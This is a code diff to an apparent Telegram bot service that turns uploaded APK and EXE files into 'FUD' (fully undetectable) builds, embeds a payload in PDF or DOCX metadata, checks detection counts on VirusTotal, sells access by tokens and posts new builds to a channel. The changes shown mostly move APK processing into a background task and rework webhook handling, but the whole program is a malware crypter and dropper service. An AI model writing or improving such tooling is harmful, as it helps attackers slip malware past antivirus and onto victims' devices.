@@ -16,7 +16,7 @@ import requests
 from pathlib import Path
 from datetime import datetime, timedelta
 from flask import Flask, jsonify, request
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot as TelegramBot
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ConversationHandler, ContextTypes
 from telegram.error import BadRequest, NetworkError
 from Crypto.Cipher import AES
@@ -42,6 +42,7 @@ DB_PATH = os.path.join(DATA_DIR, "fud_maker.db")
 DEVELOPER = "@benji_v1"
 
 # ============ FLASK ============
+application = None
 app = Flask(__name__)
 start_time = time.time()
 
@@ -260,7 +261,7 @@ class FUDApkMaker:
             shutil.rmtree(self.work_dir)
 
     def decompile(self):
-        self._progress("Decompiling APK...")
+        self._progress("Decompiling APK... (this may take a few minutes)")
         os.makedirs(self.decompiled_dir, exist_ok=True)
         result = subprocess.run([
             "apktool", "d", self.input_path,
@@ -642,6 +643,111 @@ async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
         import traceback
         traceback.print_exc()
 
+# ============ BACKGROUND TASK QUEUE ============
+pending_tasks = {}
+
+async def process_apk_background(update, context, apk_path, doc, status_msg, temp_dir):
+    """Background task for APK processing"""
+    user = update.effective_user
+    user_id = str(user.id)
+    
+    try:
+        # Progress callback
+        async def update_progress(text):
+            try:
+                await status_msg.edit_text(f"📦 Processing APK...\n\n{text}")
+            except Exception as e:
+                print(f"Progress update error: {e}")
+
+        def sync_progress(text):
+            asyncio.create_task(update_progress(text))
+
+        # Create maker and process
+        maker = FUDApkMaker(apk_path)
+        result = maker.make_fud(progress_callback=sync_progress)
+        
+        if not result['success']:
+            await status_msg.edit_text(f"❌ Build failed\n\n{result['error']}")
+            return
+
+        # VirusTotal scan
+        vt_result = None
+        if VT_API_KEY:
+            await update_progress("Scanning with VirusTotal...")
+            vt_result = scan_with_vt(result['file'])
+
+        # Log build
+        build_id = log_build(
+            user_id, user.username or "unknown", context.user_data.get('token'),
+            'apk', doc.file_name,
+            result['hash_original'], result['hash_fud'],
+            vt_result['scan_id'] if vt_result else None,
+            vt_result['positives'] if vt_result else None,
+            vt_result['total'] if vt_result else None,
+            vt_result['link'] if vt_result else None,
+            result['size_original'], result['size_fud'],
+            'done'
+        )
+
+        # Build result message
+        msg = f"✅ FUD APK Ready!\n\n"
+        msg += f"📁 Build #: {build_id}\n"
+        msg += f"📦 Original: {doc.file_name}\n"
+        msg += f"📏 Original: {result['size_original'] / 1024:.1f} KB\n"
+        msg += f"📏 FUD: {result['size_fud'] / 1024:.1f} KB\n"
+        msg += f"🔑 SHA256: {result['hash_fud'][:16]}...\n"
+
+        if vt_result:
+            status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
+            msg += f"\n🛡️ VirusTotal:\n"
+            msg += f"   {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
+            if vt_result['link']:
+                msg += f"   📊 View Report: {escape_md(vt_result['link'])}"
+
+        keyboard = [[get_back_button()], [get_cancel_button()]]
+        await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
+
+        # Send the FUD APK
+        with open(result['file'], 'rb') as f:
+            await update.message.reply_document(
+                document=f,
+                filename=f"fud_apk_{build_id}.apk",
+                caption=f"🔓 FUD APK #{build_id}"
+            )
+
+        # Auto-post to channel if configured
+        if CHANNEL_ID:
+            try:
+                channel_msg = f"🔥 New FUD APK\n\n"
+                channel_msg += f"📁 Build #{build_id}\n"
+                channel_msg += f"📦 {doc.file_name}\n"
+                channel_msg += f"📏 {result['size_fud'] / 1024:.1f} KB\n"
+                if vt_result:
+                    status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
+                    channel_msg += f"🛡️ {status_icon} {vt_result['positives']}/{vt_result['total']} detections"
+                await context.bot.send_message(chat_id=CHANNEL_ID, text=channel_msg)
+            except:
+                pass
+
+        # Cleanup
+        if os.path.exists(result['file']):
+            os.remove(result['file'])
+        if maker.work_dir and os.path.exists(maker.work_dir):
+            shutil.rmtree(maker.work_dir, ignore_errors=True)
+
+    except Exception as e:
+        await status_msg.edit_text(f"❌ Error: {str(e)}")
+        print(f"Background task error: {e}")
+        import traceback
+        traceback.print_exc()
+    finally:
+        # Cleanup temp directory
+        if os.path.exists(temp_dir):
+            shutil.rmtree(temp_dir, ignore_errors=True)
+        # Remove from pending tasks
+        if user_id in pending_tasks:
+            del pending_tasks[user_id]
+
 # ============ HANDLERS ============
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print(f"🔄 /start called by {update.effective_user.id}")
@@ -970,12 +1076,12 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print(f"📥 Received document from {user_id}")
 
     if not is_admin(user_id) and not (token and validate_token(token)):
-        await update.message.reply_text("Invalid token. Send /start.")
+        await update.message.reply_text("❌ Invalid token. Send /start.")
         return ConversationHandler.END
 
     doc = update.message.document
     if not doc:
-        await update.message.reply_text("No document found.")
+        await update.message.reply_text("❌ No document found.")
         return WAITING_APK
 
     # Better APK detection
@@ -988,88 +1094,39 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_apk:
         keyboard = [[get_cancel_button()]]
         await update.message.reply_text(
-            "Please send a valid APK file.",
+            "❌ Please send a valid APK file.",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return WAITING_APK
 
     print(f"✅ APK detected: {doc.file_name}")
-    status_msg = await update.message.reply_text("Processing APK...\n\nStarting...")
+    
+    # Check if user already has a pending task
+    if user_id in pending_tasks and not pending_tasks[user_id].done():
+        await update.message.reply_text("⏳ You already have an APK processing. Please wait.")
+        return WAITING_APK
 
+    # Send immediate acknowledgment
+    status_msg = await update.message.reply_text(
+        "📦 APK received!\n\n"
+        "🔄 Processing in background...\n"
+        "⏳ This may take 3-10 minutes.\n"
+        "📊 I'll notify you when it's ready."
+    )
+
+    # Create temp directory and download APK
     temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
     apk_path = os.path.join(temp_dir, doc.file_name)
     file_obj = await context.bot.get_file(doc.file_id)
     await file_obj.download_to_drive(apk_path)
-    print(f"✅ Downloaded APK to {apk_path}")
+    print(f"✅ Downloaded APK to {apk_path} ({os.path.getsize(apk_path) / 1024 / 1024:.1f} MB)")
 
-    async def update_progress(text):
-        try:
-            await status_msg.edit_text(f"Processing APK...\n\n{text}")
-        except Exception as e:
-            print(f"Progress update error: {e}")
-
-    def sync_progress(text):
-        asyncio.create_task(update_progress(text))
-
-    maker = FUDApkMaker(apk_path)
-    result = maker.make_fud(progress_callback=sync_progress)
-    print(f"✅ APK processing result: {result['success']}")
-
-    if not result['success']:
-        await status_msg.edit_text(f"Build failed\n\n{result['error']}")
-        shutil.rmtree(temp_dir, ignore_errors=True)
-        return ConversationHandler.END
-
-    vt_result = None
-    if VT_API_KEY:
-        await update_progress("Scanning with VirusTotal...")
-        vt_result = scan_with_vt(result['file'])
-    else:
-        await update_progress("VirusTotal API key not set. Skipping scan.")
-
-    build_id = log_build(
-        user_id, user.username or "unknown", token,
-        'apk', doc.file_name,
-        result['hash_original'], result['hash_fud'],
-        vt_result['scan_id'] if vt_result else None,
-        vt_result['positives'] if vt_result else None,
-        vt_result['total'] if vt_result else None,
-        vt_result['link'] if vt_result else None,
-        result['size_original'], result['size_fud'],
-        'done'
+    # ✅ Launch background task
+    task = asyncio.create_task(
+        process_apk_background(update, context, apk_path, doc, status_msg, temp_dir)
     )
+    pending_tasks[user_id] = task
 
-    msg = f"FUD APK Ready!\n\n"
-    msg += f"Build #: {build_id}\n"
-    msg += f"Original: {doc.file_name}\n"
-    msg += f"Original: {result['size_original'] / 1024:.1f} KB\n"
-    msg += f"FUD: {result['size_fud'] / 1024:.1f} KB\n"
-    msg += f"SHA256: {result['hash_fud'][:16]}...\n"
-
-    if vt_result:
-        status_icon = "Clean" if vt_result['clean'] else "Detected"
-        msg += f"\nVirusTotal:\n"
-        msg += f"   {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
-        if vt_result['link']:
-            msg += f"   View Report: {escape_md(vt_result['link'])}"
-
-    keyboard = [[get_back_button()], [get_cancel_button()]]
-    await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
-
-    with open(result['file'], 'rb') as f:
-        await update.message.reply_document(
-            document=f,
-            filename=f"fud_apk_{build_id}.apk",
-            caption=f"FUD APK #{build_id}"
-        )
-
-    shutil.rmtree(temp_dir, ignore_errors=True)
-    if os.path.exists(result['file']):
-        os.remove(result['file'])
-    if maker.work_dir and os.path.exists(maker.work_dir):
-        shutil.rmtree(maker.work_dir, ignore_errors=True)
-
-    print(f"✅ APK build {build_id} completed!")
     return ConversationHandler.END
 
 async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1078,19 +1135,19 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
     token = context.user_data.get('token')
 
     if not is_admin(user_id) and not (token and validate_token(token)):
-        await update.message.reply_text("Invalid token. Send /start.")
+        await update.message.reply_text("❌ Invalid token. Send /start.")
         return ConversationHandler.END
 
     doc = update.message.document
     if not doc or not doc.file_name.endswith('.exe'):
         keyboard = [[get_cancel_button()]]
         await update.message.reply_text(
-            "Please send a valid EXE file.",
+            "❌ Please send a valid EXE file.",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return WAITING_EXE
 
-    status_msg = await update.message.reply_text("Processing EXE...\n\nStarting...")
+    status_msg = await update.message.reply_text("💻 Processing EXE...\n\nStarting...")
 
     temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
     exe_path = os.path.join(temp_dir, doc.file_name)
@@ -1099,7 +1156,7 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     async def update_progress(text):
         try:
-            await status_msg.edit_text(f"Processing EXE...\n\n{text}")
+            await status_msg.edit_text(f"💻 Processing EXE...\n\n{text}")
         except Exception as e:
             pass
 
@@ -1110,7 +1167,7 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
     result = maker.make_fud(progress_callback=sync_progress)
 
     if not result['success']:
-        await status_msg.edit_text(f"Build failed\n\n{result['error']}")
+        await status_msg.edit_text(f"❌ Build failed\n\n{result['error']}")
         shutil.rmtree(temp_dir, ignore_errors=True)
         return ConversationHandler.END
 
@@ -1131,16 +1188,16 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'done'
     )
 
-    msg = f"FUD EXE Ready!\n\n"
-    msg += f"Build #{build_id}\n"
-    msg += f"Original: {result['size_original'] / 1024:.1f} KB\n"
-    msg += f"FUD: {result['size_fud'] / 1024:.1f} KB\n"
+    msg = f"✅ FUD EXE Ready!\n\n"
+    msg += f"📁 Build #{build_id}\n"
+    msg += f"📏 Original: {result['size_original'] / 1024:.1f} KB\n"
+    msg += f"📏 FUD: {result['size_fud'] / 1024:.1f} KB\n"
 
     if vt_result:
-        status_icon = "Clean" if vt_result['clean'] else "Detected"
-        msg += f"\nVirusTotal: {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
+        status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
+        msg += f"\n🛡️ VirusTotal: {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
         if vt_result['link']:
-            msg += f"View Report: {escape_md(vt_result['link'])}"
+            msg += f"📊 View Report: {escape_md(vt_result['link'])}"
 
     keyboard = [[get_back_button()], [get_cancel_button()]]
     await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
@@ -1149,7 +1206,7 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_document(
             document=f,
             filename=f"fud_exe_{build_id}.exe",
-            caption=f"FUD EXE #{build_id}"
+            caption=f"🔓 FUD EXE #{build_id}"
         )
 
     shutil.rmtree(temp_dir, ignore_errors=True)
@@ -1166,19 +1223,19 @@ async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
     token = context.user_data.get('token')
 
     if not is_admin(user_id) and not (token and validate_token(token)):
-        await update.message.reply_text("Invalid token. Send /start.")
+        await update.message.reply_text("❌ Invalid token. Send /start.")
         return ConversationHandler.END
 
     doc = update.message.document
     if not doc or not doc.file_name.endswith(('.pdf', '.docx')):
         keyboard = [[get_cancel_button()]]
         await update.message.reply_text(
-            "Please send a PDF or DOCX template.",
+            "❌ Please send a PDF or DOCX template.",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return WAITING_DOC
 
-    status_msg = await update.message.reply_text("Processing Document...\n\nEmbedding payload...")
+    status_msg = await update.message.reply_text("📄 Processing Document...\n\nEmbedding payload...")
 
     temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
     doc_path = os.path.join(temp_dir, doc.file_name)
@@ -1208,10 +1265,10 @@ async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     keyboard = [[get_back_button()], [get_cancel_button()]]
     await status_msg.edit_text(
-        f"FUD Document Ready!\n\n"
-        f"Build #{build_id}\n"
-        f"{doc.file_name}\n"
-        f"{os.path.getsize(output_path) / 1024:.1f} KB\n\n"
+        f"✅ FUD Document Ready!\n\n"
+        f"📁 Build #{build_id}\n"
+        f"📦 {doc.file_name}\n"
+        f"📏 {os.path.getsize(output_path) / 1024:.1f} KB\n\n"
         f"Payload embedded in metadata.",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
@@ -1220,7 +1277,7 @@ async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_document(
             document=f,
             filename=f"fud_doc_{build_id}.{file_ext}",
-            caption=f"FUD Document #{build_id}"
+            caption=f"📄 FUD Document #{build_id}"
         )
 
     shutil.rmtree(temp_dir, ignore_errors=True)
@@ -1240,7 +1297,7 @@ async def handle_generate_token(update: Update, context: ContextTypes.DEFAULT_TY
     except:
         keyboard = [[get_cancel_button()]]
         await update.message.reply_text(
-            "Invalid. Send: days max_uses",
+            "❌ Invalid. Send: days max_uses",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return WAITING_GENERATE_TOKEN
@@ -1250,10 +1307,10 @@ async def handle_generate_token(update: Update, context: ContextTypes.DEFAULT_TY
 
     keyboard = [[get_back_button()], [get_cancel_button()]]
     await update.message.reply_text(
-        f"Token Generated!\n\n"
-        f"{token}\n"
-        f"{days} days\n"
-        f"{max_uses} uses\n",
+        f"✅ Token Generated!\n\n"
+        f"🔑 {token}\n"
+        f"📅 {days} days\n"
+        f"🔄 {max_uses} uses\n",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
     context.user_data['gen_token_step'] = False
@@ -1267,7 +1324,7 @@ async def handle_revoke_token(update: Update, context: ContextTypes.DEFAULT_TYPE
     revoke_token(token)
     keyboard = [[get_back_button()], [get_cancel_button()]]
     await update.message.reply_text(
-        f"Token {token[:12]}... revoked.",
+        f"✅ Token {token[:12]}... revoked.",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
     context.user_data['revoke_step'] = False
@@ -1275,12 +1332,38 @@ async def handle_revoke_token(update: Update, context: ContextTypes.DEFAULT_TYPE
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
-    await update.message.reply_text("Cancelled. Send /start to begin.")
+    await update.message.reply_text("❌ Cancelled. Send /start to begin.")
     return ConversationHandler.END
 
 # ============ BOT RUNNER — POLLING MODE ============
-# ============ BOT RUNNER — POLLING MODE WITH CONFLICT RECOVERY ============
 def run_bot():
+    # First, run a standalone cleanup
+    import asyncio as cleanup_loop
+    
+    async def force_cleanup():
+        try:
+            bot = TelegramBot(token=BOT_TOKEN)
+            print("🧹 Force cleaning webhook...")
+            await bot.delete_webhook(drop_pending_updates=True)
+            print("✅ Webhook deleted.")
+            try:
+                updates = await bot.get_updates(limit=100, timeout=5)
+                print(f"📨 Cleared {len(updates)} pending updates")
+            except:
+                pass
+            return True
+        except Exception as e:
+            print(f"⚠️ Cleanup error: {e}")
+            return False
+    
+    try:
+        cleanup_loop.run(force_cleanup())
+    except:
+        pass
+    
+    time.sleep(2)
+    
+    # Now start the bot
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
 
@@ -1319,44 +1402,44 @@ def run_bot():
         application.add_handler(conv)
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_channel_post))
 
-        # ✅ Force delete webhook with retries
+        # Aggressive webhook deletion
         for attempt in range(5):
             try:
                 print(f"Deleting webhook (attempt {attempt+1}/5)...")
                 await application.bot.delete_webhook(drop_pending_updates=True)
-                print("Webhook deletion successful.")
+                print("✅ Webhook deletion successful.")
                 break
             except Exception as e:
-                print(f"Delete webhook attempt {attempt+1} failed: {e}")
+                print(f"Attempt {attempt+1} failed: {e}")
                 await asyncio.sleep(2)
-        else:
-            print("Warning: Could not delete webhook after 5 attempts. Continuing anyway.")
+        
+        # Clear pending updates
+        try:
+            print("Clearing pending updates...")
+            updates = await application.bot.get_updates(limit=100, timeout=5)
+            print(f"Cleared {len(updates)} pending updates")
+        except Exception as e:
+            print(f"Could not clear updates: {e}")
 
-        # Wait for any lingering connections to close
         await asyncio.sleep(3)
 
-        # Check webhook status
+        # Check if webhook is really gone
         try:
             webhook_info = await application.bot.get_webhook_info()
-            print(f"Webhook URL after deletion: {webhook_info.url or 'None'}")
-            print(f"Pending updates: {webhook_info.pending_update_count}")
+            if webhook_info and webhook_info.url:
+                print(f"⚠️ Webhook still set to: {webhook_info.url}")
+                print("Force deleting again...")
+                await application.bot.delete_webhook(drop_pending_updates=True)
+                await asyncio.sleep(2)
+            else:
+                print("✅ Webhook is clear.")
         except Exception as e:
-            print(f"Could not get webhook info: {e}")
-
-        # ✅ Force delete again if still set
-        if webhook_info and webhook_info.url:
-            print("Webhook still set! Force deleting with drop_pending_updates...")
-            await application.bot.delete_webhook(drop_pending_updates=True)
-            await asyncio.sleep(2)
+            print(f"Could not check webhook: {e}")
 
         print("Starting polling with long timeouts...")
         await application.initialize()
         await application.start()
 
-        # ✅ Use a unique session file to avoid conflicts (if running multiple instances)
-        # But the conflict is at Telegram level, not local.
-
-        # Start polling with error recovery
         try:
             await application.updater.start_polling(
                 drop_pending_updates=True,
@@ -1367,17 +1450,18 @@ def run_bot():
                 write_timeout=120,
                 connect_timeout=60
             )
-            print("Bot is running!")
+            print("✅ Bot is running successfully!")
         except Exception as e:
-            print(f"Polling startup error: {e}")
+            print(f"❌ Polling startup error: {e}")
+            print("⚠️ This may be due to another instance running with the same token.")
+            print("⚠️ If this persists, generate a new token from @BotFather.")
             raise
 
         # Keep alive with health check
         while True:
             try:
                 if not application.updater.running:
-                    print("Updater stopped! Restarting...")
-                    # Before restarting, delete webhook again to avoid conflict
+                    print("⚠️ Updater stopped! Restarting...")
                     await application.bot.delete_webhook(drop_pending_updates=True)
                     await application.updater.start_polling(
                         drop_pending_updates=True,
@@ -1388,7 +1472,7 @@ def run_bot():
                         write_timeout=120,
                         connect_timeout=60
                     )
-                    print("Updater restarted!")
+                    print("✅ Updater restarted!")
             except Exception as e:
                 print(f"Health check error: {e}")
             await asyncio.sleep(10)
@@ -1398,14 +1482,15 @@ def run_bot():
         try:
             loop.run_until_complete(bot_main())
         except Exception as e:
-            print(f"Bot crashed: {e}")
+            print(f"❌ Bot crashed: {e}")
             import traceback
             traceback.print_exc()
-            print("Restarting in 10 seconds...")
+            print("🔄 Restarting in 10 seconds...")
             time.sleep(10)
-            # Recreate loop to avoid closed loop issues
+            # Recreate loop
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
+
 # ============ MAIN ============
 if __name__ == '__main__':
     print("""
@@ -1418,7 +1503,6 @@ if __name__ == '__main__':
 
     def run_flask():
         port = int(os.environ.get("PORT", 8080))
-        # Use debug=False, and don't use reloader
         app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
 
     # Start Flask in a separate thread
